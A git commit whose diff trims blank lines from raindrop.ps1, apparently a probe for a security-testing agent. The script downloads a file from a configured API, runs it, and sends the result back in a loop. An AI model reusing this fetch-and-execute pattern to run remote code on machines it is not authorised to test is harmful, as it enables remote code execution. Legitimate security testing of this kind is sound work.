3ffacb92457f8882b517faa708ac32533c709ceb
privateducky <coldduck@protonmail.com>
2023-03-08 08:50:27 -0500

    ensuring raindrop is aligned w/nocturnal changes

--- shell/probe/raindrop.ps1
+++ shell/probe/raindrop.ps1
@@ -11,17 +11,14 @@ function Run {
             'dat' = $Dat
         }
         $Response = Invoke-WebRequest -URI $Api -UseBasicParsing -Headers $Headers -MaximumRedirection 1 -OutFile $Vst -PassThru
-        
         if ($CA -ne $Response.BaseResponse.ResponseUri.Authority) {
             Write-Output "[P] Bad authority: $Response.BaseResponse.ResponseUri.Authority"
             exit 0
         }
-        
         $Test = $Response.BaseResponse.ResponseUri.AbsolutePath.Split("/")[-1].Split("_")[0]
         if (-not $Test) {
             return
         }
-
         Write-Output "[P] Running $Test [$Vst]" 
         $Code = Execute $Vst   
         Run -Dat "${Test}:$Code"
